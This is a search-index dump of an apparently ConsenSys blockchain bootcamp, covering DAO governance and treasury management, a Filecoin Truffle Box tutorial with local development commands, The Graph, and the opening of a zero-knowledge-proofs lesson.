begin to roll out in 2021 and onward, we shall see more on-chain voting as a result. For example, Aragon is already looking to roll out Optimism. There are several issues with voting. One is low turnout and engagement. This plagues many protocols and DAOs as users wish to get the financial upside without commensurate voting. As a result, some protocols are turning to using vote boosting and locking mechanisms like veCRV from Curve and oSUSHI . The reason is twofold. First, it helps reduce the dumping pressure from tokens by restricting supply and locking tokens up. Second, it gives an earning and/or voting boost to long term stakers who are more engaged. This works well with inflationary tokens as it subtly transfers value from passive and inactive participants to more active members. Another technique to deal with voter apathy is vote delegation. Some protocols allow token holders to delegate their votes to a representative. One version of this is liquid democracy . Adressen Horowitz, which has several billion-dollar funds to invest in crypto, has a great post on designing token delegation systems . Another is the frequency of votes. Too many votes in a period could wear out existing engaged users. Too frequent will make them passive. Having a consistent cadence of votes allows for predictability and the creation of habits. Another issue can be around voting in general. What is fairness in voting? How can one allocate resources optimally? Voting can go beyond just one entity, one vote. What about minority votes? Here is where we get into game theory, systems design and political theory, which are outside the scope of this write-up. However, there are some rabbit holes to go into and explore. Web3 has something for everyone \ud83d\ude01. Vitalik Buterin wrote a great piece on quadratic voting , coin voting governance , and blockchain voting . A great twitter follow related to governance and funding of public goods are the awesome folks at Gitcoin , especially Kevin Owocki . Check out his website . Implementation Once an improvement proposal is passed, it's placed on the roadmap. Having a clear roadmap helps with communication and expectations. A community builds social capital with itself if it's able to make a promise, aka pass a proposal, and deliver on it. Roadmaps don't have to have exact time dates, but having a clear hierarchy of what is important and a rough time estimate is essential. Implementation can be done by the core team/organizers or by community members. Typically the more decentralized the work, the more coordination is needed. However, if done right, things can move fast. Aiming for good communication with clear roles and responsibilities between teams helps to reduce burnout and increases engagement . Be warned that community organizing can be time-intensive and involve work. However, having clear incentives, good treasury management skills, and memes can help members step up to the plate and help while fostering community. Treasury Management Treasury management is part of community management. How we manage the treasury affects the sustainability of the DAO. A practical example can be in the diversification of funds . If a DAO holds a large percentage of their own tokens, it creates risk . The value of the token could drop, affecting the ability to fund operations. It could also affect the incentive structure to keep members. Because of this, projects like SushiSwap have tried to diversify their assets into stablecoins . Another method is to take a cut of economic activity happening in the network to fund operations like SushiSwap's Kanpai . Another practical method of treasury management is the inflation rate of the token. Inflation rates via yield farming can be a great tool to get new members. For utility tokens, they help move capital from passive holders to active contributors who create value. However, if used incorrectly, inflation rewards can spin out of control and follow a predictable ponzinomics of inflation and collapse . At the end of the day, no amount of clever financial engineering can substitute for authentic community engagement and the value they provide. And more There is so much more that can be covered; however, the best way to learn is to join a DAO and start your own! Have fun and experiment! There is still more to learn about raising funds and such. However, let's call it a day and revisit this in Part 2 sometime. Learn more DAO Virtual Summit DAO research papers Fair Launch Summit DAOTalk.org \ud83c\udf89 \ud83e\udd73 You made it this far! You get an Easter Egg \ud83e\udd5a. Bonus! After the bootcamp check out some cool videos around a16z\u2019s Crypto School and check out ConsenSys Tachyon , our blockchain accelerator.","title":"DAO - Decentralized Autonomous Organizations"},{"location":"S06-daos/M3-manage/#dao-decentralized-autonomous-organizations","text":"\u201cIf you want to go fast, go alone. If you want to go far, go together.\u201d \u2013 African proverb.","title":"DAO - Decentralized Autonomous Organizations"},{"location":"S06-daos/M3-manage/#manage-and-scale-a-dao","text":"","title":"Manage and Scale a DAO"},{"location":"S06-daos/M3-manage/#soft-skills","text":"Decentralization doesn\u2019t just have smart contracts. DAO are about people, and thus soft skills are essential. Jono Bacon has written the best book on community management called \u201cThe Art of Community\u201d . It is HIGHLY recommended to read. A great way to get the soft skills to manage a DAO is to join a meetup and perhaps co-organize an event. You can find Ethereum meetups with like-minded individuals around the world via the ConsenSys BUDIL Network . In addition, you can become a valued member of a community by joining the ConsenSys Discord. Another way is by joining a project like AirSwap ! AirSwap is dedicated to creating tools for frictionless trade. They have an excellent governance system and need devs like you! Join their Discord and check out their roadmap. If NFTs are your thing, check out Megaliths . Or check out the DAOs on DAOHaus. DAOs also need clear lines of communication, transparency of information, and an inclusive governance structure. This means a transparent voting process and consensus making mechanism.","title":"Soft Skills"},{"location":"S06-daos/M3-manage/#code-of-conduct","text":"Along with a mission statement, a Code of Conduct is a must. A great one that can be built off is the Berlin Code of Conduct which is open source, modifiable and extensible. A code of conduct is a MUST. As groups start to scale, there will inevitably be issues with certain members. Remarkably, most people are chill, and you can set the tone very easily by having clear expectations written in a code of conduct. The clearer your rules are, the easier it is to collaborate.","title":"Code of Conduct"},{"location":"S06-daos/M3-manage/#governance-structure","text":"Decentralization means clear governance structures. Luckily we have some prior history with specific DeFi projects from which we can learn. For example, yearn Finance, Synthetix, Compound Finance and MakerDAO have great governance models worth studying.","title":"Governance Structure"},{"location":"S06-daos/M3-manage/#improvement-process","text":"The improvement process is the method by which projects like Ethereum, protocols and DAO manage change. There are typically three types of proposals. Improvement proposals involve adding, removing, or improving some code, to the project or adjusting to governance. This could be adding a new feature for members or users. Configuration proposals involve adjusting variables in smart contracts, say the collateralization ratio. Finally, meta proposals involve proposals around the improvement process itself. The general process for creating a proposal is:","title":"Improvement Process"},{"location":"S06-daos/M3-manage/#discussion","text":"Discussions start informally via chat platforms, online forums and meetings. Eventually, the ideas begin to coalesce into something tangible. The next move could be a temperature check, where a quick poll can gauge support said idea. During this process, the ideas are refined as they are still in a nascent stage. It is interesting to note that Discord and chat platforms, in general, are great for creating community building, brainstorming and getting immediate feedback. However, due to a chat platform's UX/UI, they are NOT a great place to host binding votes or establish long-form conversations. Discourse allows for long-form threads, which allow for more well thought out conversations. However, this comes at the cost of a lack of immediacy in response. Discourse can also be configured to be found on search engines, which help with attracting potential members. Some Discourse forums are more technically focused on catering to their audiences, like Ethresear.ch or research.synthetix.io . Others are more informal. Tailor it to suit your needs. Side note, you can customize your Discourse template to make it more UX/UI friendly and organized. That effort will go a long way.","title":"Discussion"},{"location":"S06-daos/M3-manage/#write-up-of-improvement-proposal","text":"Once the idea has been discussed, a draft is created. There are various tags for proposals. The general gist of these are: Draft - still in draft stage Review - finalized and open for further community input. It can go back to the draft stage. Submitted - staged to go through the proposal process. The voting period is set. Pending Vote - in vote stage Accepted - went through with a number of votes needed Rejected - rejected. Back to the drawing boards or abandoned Completed - Team has implemented the proposal There can be other tags like On Roadmap . Again, you can customize these as your community sees fit.","title":"Write up of Improvement Proposal"},{"location":"S06-daos/M3-manage/#voting","text":"Usually, voting occurs with a governance token. This corresponds to 1 token = 1 vote. Although this may seem unfair, it is the only method known to prevent Sybil attacks. Perhaps once the industry figures out how to use decentralized identities, we can see more typical voting forms. The leading DeFi Protocols use Snapshot as their tool of choice to avoid gas fees. However, as Layer 2 solutions begin to roll out in 2021 and onward, we shall see more on-chain voting as a result. For example, Aragon is already looking to roll out Optimism. There are several issues with voting. One is low turnout and engagement. This plagues many protocols and DAOs as users wish to get the financial upside without commensurate voting. As a result, some protocols are turning to using vote boosting and locking mechanisms like veCRV from Curve and oSUSHI . The reason is twofold. First, it helps reduce the dumping pressure from tokens by restricting supply and locking tokens up. Second, it gives an earning and/or voting boost to long term stakers who are more engaged. This works well with inflationary tokens as it subtly transfers value from passive and inactive participants to more active members. Another technique to deal with voter apathy is vote delegation. Some protocols allow token holders to delegate their votes to a representative. One version of this is liquid democracy . Adressen Horowitz, which has several billion-dollar funds to invest in crypto, has a great post on designing token delegation systems . Another is the frequency of votes. Too many votes in a period could wear out existing engaged users. Too frequent will make them passive. Having a consistent cadence of votes allows for predictability and the creation of habits. Another issue can be around voting in general. What is fairness in voting? How can one allocate resources optimally? Voting can go beyond just one entity, one vote. What about minority votes? Here is where we get into game theory, systems design and political theory, which are outside the scope of this write-up. However, there are some rabbit holes to go into and explore. Web3 has something for everyone \ud83d\ude01. Vitalik Buterin wrote a great piece on quadratic voting , coin voting governance , and blockchain voting . A great twitter follow related to governance and funding of public goods are the awesome folks at Gitcoin , especially Kevin Owocki . Check out his website .","title":"Voting"},{"location":"S06-daos/M3-manage/#implementation","text":"Once an improvement proposal is passed, it's placed on the roadmap. Having a clear roadmap helps with communication and expectations. A community builds social capital with itself if it's able to make a promise, aka pass a proposal, and deliver on it. Roadmaps don't have to have exact time dates, but having a clear hierarchy of what is important and a rough time estimate is essential. Implementation can be done by the core team/organizers or by community members. Typically the more decentralized the work, the more coordination is needed. However, if done right, things can move fast. Aiming for good communication with clear roles and responsibilities between teams helps to reduce burnout and increases engagement . Be warned that community organizing can be time-intensive and involve work. However, having clear incentives, good treasury management skills, and memes can help members step up to the plate and help while fostering community.","title":"Implementation"},{"location":"S06-daos/M3-manage/#treasury-management","text":"Treasury management is part of community management. How we manage the treasury affects the sustainability of the DAO. A practical example can be in the diversification of funds . If a DAO holds a large percentage of their own tokens, it creates risk . The value of the token could drop, affecting the ability to fund operations. It could also affect the incentive structure to keep members. Because of this, projects like SushiSwap have tried to diversify their assets into stablecoins . Another method is to take a cut of economic activity happening in the network to fund operations like SushiSwap's Kanpai . Another practical method of treasury management is the inflation rate of the token. Inflation rates via yield farming can be a great tool to get new members. For utility tokens, they help move capital from passive holders to active contributors who create value. However, if used incorrectly, inflation rewards can spin out of control and follow a predictable ponzinomics of inflation and collapse . At the end of the day, no amount of clever financial engineering can substitute for authentic community engagement and the value they provide.","title":"Treasury Management"},{"location":"S06-daos/M3-manage/#and-more","text":"There is so much more that can be covered; however, the best way to learn is to join a DAO and start your own! Have fun and experiment! There is still more to learn about raising funds and such. However, let's call it a day and revisit this in Part 2 sometime.","title":"And more"},{"location":"S06-daos/M3-manage/#learn-more","text":"DAO Virtual Summit DAO research papers Fair Launch Summit DAOTalk.org \ud83c\udf89 \ud83e\udd73 You made it this far! You get an Easter Egg \ud83e\udd5a. Bonus! After the bootcamp check out some cool videos around a16z\u2019s Crypto School and check out ConsenSys Tachyon , our blockchain accelerator.","title":"Learn more"},{"location":"S07-additional-topics/L1-ipfs/","text":"This section is currently a video on the LMS","title":"Index"},{"location":"S07-additional-topics/L2-filecoin/","text":"Filecoin Protocol Labs, who built IPFS, have developed an entire network for decentralized filesharing called Filecoin. In this section, we'll go through a Truffle Box which sets up a Filecoin environment on your computer. Using the Filecoin Truffle Box This quick start uses an already-created project to provide the base Truffle project structure and example contracts. In your workspace directory, run the following commands: mkdir filecoin-example cd filecoin-example truffle unbox filecoin Running Filecoin Ganache Once installed, you can run Filecoin Ganache with the following command: npx ganache filecoin This creates 10 accounts, each loaded with 100 FIL, and displays both their account addresses and associated private keys. Available Accounts ================== (0) t3rvcqmc5otc3sh3cngqg2ttzcu7ezpco466lbafzaoygxvnzsw7e7n2zbjwhiv5fdzhs6uxm2qckwt6lp5wga (100 FIL) (1) t3s3la37547tijmoeiep7ktogws3tep2eqrralh7rhi2mpe46q574gceyy467356onblzvwf7ejlelo2rdsg4q (100 FIL) (2) t3wk7a46e2dcqb7qxeuz2zq7wodwycdgtbgdpr37hhvelfilf5yvssg5xbsolgusqsumomtmtqhnobh4carhyq (100 FIL) ... It also starts the Lotus and IPFS daemons running over http and ws respectively: Lotus RPC listening on 127.0.0.1:7777 IPFS RPC listening on 127.0.0.1:5001 Filecoin Ganache GUI An alternative to running Filecoin Ganache via the CLI is to use Filecoin Ganche UI. As per the screenshot below, this exposes all the core Filecoin protocol elements as tabs which is particularly useful if you're just starting out. Running the Filecoin Network Explorer git clone https://github.com/trufflesuite/filecoin-network-inspector cd filecoin-network-inspector git checkout ganache-changes npm install npm run start Running Ethereum Ganache npx ganache ethereum RPC Listening on 127.0.0.1:8545 Creating Storage Deals A storage deal is an agreement between a client and a storage miner to store some data in the network for a given duration. Note that while in the case of Filecoin's mainnet, a deal must be secured with a miner before data is stored, in Filecoin Ganache a deal is reached automatically. Via the Filecoin Network Explorer The simplest way to store data, open the Filecoin Network Explorer and navigate to the \"Market\" tab. From here you can select a file by clicking \"Choose File\" followed by \"Upload to the Filecoin Network\". Truffle Preserve Truffle now has a preserve command which allows for the 'preservation' of files directly from the Truffle CLI. This is currently experimental and thus on specific branch; installation details available at here. Once installed, you'll be able to preserve your assets via the following command. Note that you'll need to include the environments object in your truffle-config.js to point at the respective node (although these are already preconfigured in the box). truffle preserve --environment development ./assets/ --filecoin For broader help with this command run truffle help preserve. Via Curl (or equivalent) Lastly, you can send the following curl request directly to the Lotus RPC. Note that the you'll need to update both the wallet address (t3s3la3754...) and CID (QmZTR5bcpQ...). curl -X POST \\ -H 'Content-Type: application/json' \\ -d '{\"jsonrpc\":\"2.0\",\"id\":0,\"method\":\"Filecoin.ClientStartDeal\",\"params\":[{\"Data\":{\"TransferType\":\"graphsync\",\"Root\":{\"/\":\"QmZTR5bcpQD7cFgTorqxZDYaew1Wqgfbd2ud9QqGPAkK2V\"},\"PieceCid\":null,\"PieceSize\":0},\"Wallet\":\"t3s3la37547tijmoeiep7ktogws3tep2eqrralh7rhi2mpe46q574gceyy467356onblzvwf7ejlelo2rdsg4q\",\"Miner\":\"t01000\",\"EpochPrice\":\"2500\",\"MinBlocksDuration\":300}]}' \\ http://localhost:7777/rpc/v0 Minting an NFT In the example below, we've already created a deal for the 3 assets (metadata, thumbnail, and the original asset respectively) that comprise our NFT. These are as follows, with their corresponding CIDs. metadata QmS4t7rFPxaaNriXvCmALr5GYRAtya5urrDaZgkfHutdCG thumbnail - QmbAAMaGWpiSgmMWYTRtGsru382j6qTVQ4FDKX2cRTRso6 asset - QmbAAMaGWpiSgmMWYTRtGsru382j6qTVQ4FDKX2cRTRso6 Assuming the local Ethereum Ganache node is running, you'll be able to open a console and mint a new NFT with the following steps. As the base URL is set to that of an IPFS gateway, we'll just need to pass in the CID to the asset metadata. truffle migrate truffle console truffle ( development ) > const gallery = await MyGallery . deployed () truffle ( development ) > gallery . mint ( accounts [ 0 ], \"QmS4t7rFPxaaNriXvCmALr5GYRAtya5urrDaZgkfHutdCG\" ) In the above example the owner of the NFT is set (via accounts[0]) to that of the first account generated by the mnemonic. If we want to transfer it to a new owner, we'll be able to do so with the following. Transferring Ownership truffle console truffle(development)> gallery.transferFrom(accounts[0], accounts[1], 1) Gallery UI A sample gallery interface is available here.\u200b\u200b You can use the following steps to run this locally... cd ui npm install npm run start Off-chain Assets Thus far we\u2019ve been exclusively referring to data that will be stored on-chain. While this is logical for certain types of data in your dapp, what about other facets (such an underlying NFT asset or a web-based front-end)? Ideally we can still take advantage of the benefits of decentralization without incurring the cost and performance overhead of trying to store on-chain. This is where services such as IPFS, Arweave, or Textile Buckets come in, along with complimentary storage solutions like Filecoin. Storing with Truffle Preserve Truffle has a built-in command called preserve that supports a number of the aforementioned services right out of the box. An example of it\u2019s usage is follows, with ./path being the path to the directory you want to persist. truffle preserve ./path The above example assumes you have a locally running IPFS node, but if not you can leverage Infura\u2019s gateway by adding the following to your truffle-config.js and then appending --environment production to the command. environments: { production: { ipfs: { address: 'https://ipfs.infura.io:5001' } } } The resultant content identified (CID) will then be returned for you to then persist with a Filecoin storage deal or pinning service. More detail can be found in the Truffle docs .","title":"Filecoin"},{"location":"S07-additional-topics/L2-filecoin/#filecoin","text":"Protocol Labs, who built IPFS, have developed an entire network for decentralized filesharing called Filecoin. In this section, we'll go through a Truffle Box which sets up a Filecoin environment on your computer.","title":"Filecoin"},{"location":"S07-additional-topics/L2-filecoin/#using-the-filecoin-truffle-box","text":"This quick start uses an already-created project to provide the base Truffle project structure and example contracts. In your workspace directory, run the following commands: mkdir filecoin-example cd filecoin-example truffle unbox filecoin","title":"Using the Filecoin Truffle Box"},{"location":"S07-additional-topics/L2-filecoin/#running-filecoin-ganache","text":"Once installed, you can run Filecoin Ganache with the following command: npx ganache filecoin This creates 10 accounts, each loaded with 100 FIL, and displays both their account addresses and associated private keys. Available Accounts ================== (0) t3rvcqmc5otc3sh3cngqg2ttzcu7ezpco466lbafzaoygxvnzsw7e7n2zbjwhiv5fdzhs6uxm2qckwt6lp5wga (100 FIL) (1) t3s3la37547tijmoeiep7ktogws3tep2eqrralh7rhi2mpe46q574gceyy467356onblzvwf7ejlelo2rdsg4q (100 FIL) (2) t3wk7a46e2dcqb7qxeuz2zq7wodwycdgtbgdpr37hhvelfilf5yvssg5xbsolgusqsumomtmtqhnobh4carhyq (100 FIL) ... It also starts the Lotus and IPFS daemons running over http and ws respectively: Lotus RPC listening on 127.0.0.1:7777 IPFS RPC listening on 127.0.0.1:5001","title":"Running Filecoin Ganache"},{"location":"S07-additional-topics/L2-filecoin/#filecoin-ganache-gui","text":"An alternative to running Filecoin Ganache via the CLI is to use Filecoin Ganche UI. As per the screenshot below, this exposes all the core Filecoin protocol elements as tabs which is particularly useful if you're just starting out.","title":"Filecoin Ganache GUI"},{"location":"S07-additional-topics/L2-filecoin/#running-the-filecoin-network-explorer","text":"git clone https://github.com/trufflesuite/filecoin-network-inspector cd filecoin-network-inspector git checkout ganache-changes npm install npm run start","title":"Running the Filecoin Network Explorer"},{"location":"S07-additional-topics/L2-filecoin/#running-ethereum-ganache","text":"npx ganache ethereum RPC Listening on 127.0.0.1:8545","title":"Running Ethereum Ganache"},{"location":"S07-additional-topics/L2-filecoin/#creating-storage-deals","text":"A storage deal is an agreement between a client and a storage miner to store some data in the network for a given duration. Note that while in the case of Filecoin's mainnet, a deal must be secured with a miner before data is stored, in Filecoin Ganache a deal is reached automatically. Via the Filecoin Network Explorer The simplest way to store data, open the Filecoin Network Explorer and navigate to the \"Market\" tab. From here you can select a file by clicking \"Choose File\" followed by \"Upload to the Filecoin Network\".","title":"Creating Storage Deals"},{"location":"S07-additional-topics/L2-filecoin/#truffle-preserve","text":"Truffle now has a preserve command which allows for the 'preservation' of files directly from the Truffle CLI. This is currently experimental and thus on specific branch; installation details available at here. Once installed, you'll be able to preserve your assets via the following command. Note that you'll need to include the environments object in your truffle-config.js to point at the respective node (although these are already preconfigured in the box). truffle preserve --environment development ./assets/ --filecoin For broader help with this command run truffle help preserve. Via Curl (or equivalent) Lastly, you can send the following curl request directly to the Lotus RPC. Note that the you'll need to update both the wallet address (t3s3la3754...) and CID (QmZTR5bcpQ...). curl -X POST \\ -H 'Content-Type: application/json' \\ -d '{\"jsonrpc\":\"2.0\",\"id\":0,\"method\":\"Filecoin.ClientStartDeal\",\"params\":[{\"Data\":{\"TransferType\":\"graphsync\",\"Root\":{\"/\":\"QmZTR5bcpQD7cFgTorqxZDYaew1Wqgfbd2ud9QqGPAkK2V\"},\"PieceCid\":null,\"PieceSize\":0},\"Wallet\":\"t3s3la37547tijmoeiep7ktogws3tep2eqrralh7rhi2mpe46q574gceyy467356onblzvwf7ejlelo2rdsg4q\",\"Miner\":\"t01000\",\"EpochPrice\":\"2500\",\"MinBlocksDuration\":300}]}' \\ http://localhost:7777/rpc/v0","title":"Truffle Preserve"},{"location":"S07-additional-topics/L2-filecoin/#minting-an-nft","text":"In the example below, we've already created a deal for the 3 assets (metadata, thumbnail, and the original asset respectively) that comprise our NFT. These are as follows, with their corresponding CIDs. metadata QmS4t7rFPxaaNriXvCmALr5GYRAtya5urrDaZgkfHutdCG thumbnail - QmbAAMaGWpiSgmMWYTRtGsru382j6qTVQ4FDKX2cRTRso6 asset - QmbAAMaGWpiSgmMWYTRtGsru382j6qTVQ4FDKX2cRTRso6 Assuming the local Ethereum Ganache node is running, you'll be able to open a console and mint a new NFT with the following steps. As the base URL is set to that of an IPFS gateway, we'll just need to pass in the CID to the asset metadata. truffle migrate truffle console truffle ( development ) > const gallery = await MyGallery . deployed () truffle ( development ) > gallery . mint ( accounts [ 0 ], \"QmS4t7rFPxaaNriXvCmALr5GYRAtya5urrDaZgkfHutdCG\" ) In the above example the owner of the NFT is set (via accounts[0]) to that of the first account generated by the mnemonic. If we want to transfer it to a new owner, we'll be able to do so with the following. Transferring Ownership truffle console truffle(development)> gallery.transferFrom(accounts[0], accounts[1], 1)","title":"Minting an NFT"},{"location":"S07-additional-topics/L2-filecoin/#gallery-ui","text":"A sample gallery interface is available here.\u200b\u200b You can use the following steps to run this locally... cd ui npm install npm run start","title":"Gallery UI"},{"location":"S07-additional-topics/L2-filecoin/#off-chain-assets","text":"Thus far we\u2019ve been exclusively referring to data that will be stored on-chain. While this is logical for certain types of data in your dapp, what about other facets (such an underlying NFT asset or a web-based front-end)? Ideally we can still take advantage of the benefits of decentralization without incurring the cost and performance overhead of trying to store on-chain. This is where services such as IPFS, Arweave, or Textile Buckets come in, along with complimentary storage solutions like Filecoin.","title":"Off-chain Assets"},{"location":"S07-additional-topics/L2-filecoin/#storing-with-truffle-preserve","text":"Truffle has a built-in command called preserve that supports a number of the aforementioned services right out of the box. An example of it\u2019s usage is follows, with ./path being the path to the directory you want to persist. truffle preserve ./path The above example assumes you have a locally running IPFS node, but if not you can leverage Infura\u2019s gateway by adding the following to your truffle-config.js and then appending --environment production to the command. environments: { production: { ipfs: { address: 'https://ipfs.infura.io:5001' } } } The resultant content identified (CID) will then be returned for you to then persist with a Filecoin storage deal or pinning service. More detail can be found in the Truffle docs .","title":"Storing with Truffle Preserve"},{"location":"S07-additional-topics/L3-the-graph/","text":"The Graph The Graph is a decentralized protocol for indexing and querying data on public blockchain infrastructure. The Graph organizes and makes it easy to query on-chain data in a way that was not possible in the past, with GraphQL. Querying blockchain data is difficult. Node clients can be inconsistent, application developers are required to write proprietary code and build centralized servers for ingesting the data, and they need to manage their own APIs for uptime and optimal UX. The Graph aims to solve this problem by abstracting the back-end, pre-aggregate data and making it significantly more efficient for developers to retrieve on-chain data. See video below: GRT is the native Graph token that is used to coordinate Indexers, Curators and Delegators around providing on-chain data to applications. Node operators, called Indexers, stake and earn GRT for indexing subgraphs and processing queries for dApps, such as querying for aggregate trade volume on DEXs. Delegators contribute to the security of the network by delegating their GRT stake to Indexers and also earning a portion of query fees. Delegation enables Indexers to grow in proportional size on the network and increase their indexing operation to serve more applications. Anyone can delegate GRT to Indexers to secure the network and earn rewards. Curators organize data on The Graph by signaling GRT on useful APIs, called subgraphs. Indexers look out for subgraph signal to understand which subgraphs should be prioritized based on the collective sentiment and aggregate signal. Signaling on a subgraph is a mechanism similar to leaving Yelp reviews, whereby all participants are curating the quality of the ecosystem. Indexers, Delegators, and Curators work together to organize the data for the crypto economy and maintain a useful global API for DeFi and Web3. What is a Subgraph? In the traditional web stack, databases, servers, and APIs query, filter, sort, paginate, group, and join data before it is returned to some client application usually via some type of http request. These types of data transformations are not possible when reading data directly from Ethereum or other blockchains. In the past, developers were getting around this by building their own centralized indexing servers - pulling data from blockchains, storing it in a database, and exposing it over an API. This required significant engineering and hardware resources that broke the important security properties required for decentralization. Through The Graph\u2019s protocol, developers can deploy subgraphs (open source APIs) to query on-chain data, for dapps like DeFi aggregators, wallets and NFT marketplaces. Alternatively, developers would need to build their own proprietary servers and act as a potential central point of failure for their dapp. See the video below on why subgraphs are important to the dApp ecosystem: Why do we care about Subgraphs (dApp perspective) Subgraphs enable blockchain data to be accessible via performant and open APIs with rich querying capabilities like enabling filtering, relationships, and full text search. They are a way to define which data you want to get indexed and how to store it. Subgraphs can be built to do pre-aggregations or calculations on their mappings, some are just used to organize on-chain event data. Then, an entity queries that data. This entity could be a dApp (company/developer, etc), or could be a telegram bot, or a discord bot or even a simple user doing a query to find information. The value of using a subgraph when building a dApp is that your application data will always be indexed by a network of indexers, so that users can easily query your smart contract. This means that your API cannot be taken down and ensuring a decentralized network of Indexers and Curators will always serve your dapp\u2019s queries. This also limits the risk of central points of failure. Imagine that no one knows what Wikipedia is because Wikipedia has not built a code to interact with Google\u2019s index, therefore anyone querying searching information will not turn up any results from Wikipedia. It is vital and in the best interest of the dApp team to develop a subgraph so that information is easily accessible to other developers in the Ethereum community. For example, the Uniswap subgraph is used by Uniswap.info as well as many other projects that are interested in querying Uniswap data such as trade volumes, prices or assets. Subgraphs are written in TypeScript and GraphQL SDL and queried using GraphQL. To learn more about GraphQL and how it will power the decentralized web as a data interoperability layer, read this blog post written by The Graph Co-founder and former Research Lead, Brandon Ramirez. Feel free to also check out The Graph's network documentation for more details . Video explainer below: How to build a Subgraph For a step by step guide on how to build a Subgraph, check out this guide written by DevRel lead, Nader Dabit at Edge & Node. For a video guide, watch below! For a more general guide on how to get started with web3, check out this guide . Querying from a Frontend Application Follow the guide in Gitpod and video below: API Key Management Regardless of whether you\u2019re a dApp developer or a subgraph developer, you\u2019ll need to manage your API keys. This is important for you to be able to query subgraphs because API keys make sure the connections between application services are valid and authorized. This includes authenticating the end user and the device using the application. The Subgraph Studio will list out existing API keys, which will give you the ability to manage or delete them. For more details, follow along in the video below: The Graph Explorer The Graph Explorer is a developer's decentralized portal into the world of subgraphs and network data. The Graph Explorer consists of multiple parts where developers can interact with other subgraph developers, dApp developers, Curators, Indexers, and Delegators. For a general overview of the Graph Explorer, check out the video below or read The Graph's documentation here .","title":"The Graph"},{"location":"S07-additional-topics/L3-the-graph/#the-graph","text":"The Graph is a decentralized protocol for indexing and querying data on public blockchain infrastructure. The Graph organizes and makes it easy to query on-chain data in a way that was not possible in the past, with GraphQL. Querying blockchain data is difficult. Node clients can be inconsistent, application developers are required to write proprietary code and build centralized servers for ingesting the data, and they need to manage their own APIs for uptime and optimal UX. The Graph aims to solve this problem by abstracting the back-end, pre-aggregate data and making it significantly more efficient for developers to retrieve on-chain data. See video below: GRT is the native Graph token that is used to coordinate Indexers, Curators and Delegators around providing on-chain data to applications. Node operators, called Indexers, stake and earn GRT for indexing subgraphs and processing queries for dApps, such as querying for aggregate trade volume on DEXs. Delegators contribute to the security of the network by delegating their GRT stake to Indexers and also earning a portion of query fees. Delegation enables Indexers to grow in proportional size on the network and increase their indexing operation to serve more applications. Anyone can delegate GRT to Indexers to secure the network and earn rewards. Curators organize data on The Graph by signaling GRT on useful APIs, called subgraphs. Indexers look out for subgraph signal to understand which subgraphs should be prioritized based on the collective sentiment and aggregate signal. Signaling on a subgraph is a mechanism similar to leaving Yelp reviews, whereby all participants are curating the quality of the ecosystem. Indexers, Delegators, and Curators work together to organize the data for the crypto economy and maintain a useful global API for DeFi and Web3.","title":"The Graph"},{"location":"S07-additional-topics/L3-the-graph/#what-is-a-subgraph","text":"In the traditional web stack, databases, servers, and APIs query, filter, sort, paginate, group, and join data before it is returned to some client application usually via some type of http request. These types of data transformations are not possible when reading data directly from Ethereum or other blockchains. In the past, developers were getting around this by building their own centralized indexing servers - pulling data from blockchains, storing it in a database, and exposing it over an API. This required significant engineering and hardware resources that broke the important security properties required for decentralization. Through The Graph\u2019s protocol, developers can deploy subgraphs (open source APIs) to query on-chain data, for dapps like DeFi aggregators, wallets and NFT marketplaces. Alternatively, developers would need to build their own proprietary servers and act as a potential central point of failure for their dapp. See the video below on why subgraphs are important to the dApp ecosystem:","title":"What is a Subgraph?"},{"location":"S07-additional-topics/L3-the-graph/#why-do-we-care-about-subgraphs-dapp-perspective","text":"Subgraphs enable blockchain data to be accessible via performant and open APIs with rich querying capabilities like enabling filtering, relationships, and full text search. They are a way to define which data you want to get indexed and how to store it. Subgraphs can be built to do pre-aggregations or calculations on their mappings, some are just used to organize on-chain event data. Then, an entity queries that data. This entity could be a dApp (company/developer, etc), or could be a telegram bot, or a discord bot or even a simple user doing a query to find information. The value of using a subgraph when building a dApp is that your application data will always be indexed by a network of indexers, so that users can easily query your smart contract. This means that your API cannot be taken down and ensuring a decentralized network of Indexers and Curators will always serve your dapp\u2019s queries. This also limits the risk of central points of failure. Imagine that no one knows what Wikipedia is because Wikipedia has not built a code to interact with Google\u2019s index, therefore anyone querying searching information will not turn up any results from Wikipedia. It is vital and in the best interest of the dApp team to develop a subgraph so that information is easily accessible to other developers in the Ethereum community. For example, the Uniswap subgraph is used by Uniswap.info as well as many other projects that are interested in querying Uniswap data such as trade volumes, prices or assets. Subgraphs are written in TypeScript and GraphQL SDL and queried using GraphQL. To learn more about GraphQL and how it will power the decentralized web as a data interoperability layer, read this blog post written by The Graph Co-founder and former Research Lead, Brandon Ramirez. Feel free to also check out The Graph's network documentation for more details . Video explainer below:","title":"Why do we care about Subgraphs (dApp perspective)"},{"location":"S07-additional-topics/L3-the-graph/#how-to-build-a-subgraph","text":"For a step by step guide on how to build a Subgraph, check out this guide written by DevRel lead, Nader Dabit at Edge & Node. For a video guide, watch below! For a more general guide on how to get started with web3, check out this guide .","title":"How to build a Subgraph"},{"location":"S07-additional-topics/L3-the-graph/#querying-from-a-frontend-application","text":"Follow the guide in Gitpod and video below:","title":"Querying from a Frontend Application"},{"location":"S07-additional-topics/L3-the-graph/#api-key-management","text":"Regardless of whether you\u2019re a dApp developer or a subgraph developer, you\u2019ll need to manage your API keys. This is important for you to be able to query subgraphs because API keys make sure the connections between application services are valid and authorized. This includes authenticating the end user and the device using the application. The Subgraph Studio will list out existing API keys, which will give you the ability to manage or delete them. For more details, follow along in the video below:","title":"API Key Management"},{"location":"S07-additional-topics/L3-the-graph/#the-graph-explorer","text":"The Graph Explorer is a developer's decentralized portal into the world of subgraphs and network data. The Graph Explorer consists of multiple parts where developers can interact with other subgraph developers, dApp developers, Curators, Indexers, and Delegators. For a general overview of the Graph Explorer, check out the video below or read The Graph's documentation here .","title":"The Graph Explorer"},{"location":"S07-additional-topics/L4-zkp/","text":"Zero-Knowledge Proofs In our section on scalability later in the course, we will discuss Zero-Knowledge Proof rollups, but we won't go into detail about what ZKPs are. In this section, we'll discuss the basics of ZKPs and compare two common implementations of ZKPs you'll see in blockchain. Zero-Knowledge Proofs have been researched since the 1980s\u2014the initial researchers of ZKPs received the Turing Award, the highest award in computer science, for their work. Their development stems from the field of computational complexity and, while most of the work of ZKPs is very technical, we'll try to provide a broad overview. The goal of zero-knowledge proofs (ZKPs) is for a verifier to be able to convince themselves that a prover possesses knowledge of a secret parameter, called a witness , satisfying some relation, without revealing the witness to the verifier or anyone else. Zero-knowledge proofs are currently being researched as solutions to two main issues in public blockchains: Privacy: All essential information within a blockchain network must be public. ZKPs allow users to verify / prove certain elements of information (such as the answer to a crossword puzzle) while not revealing 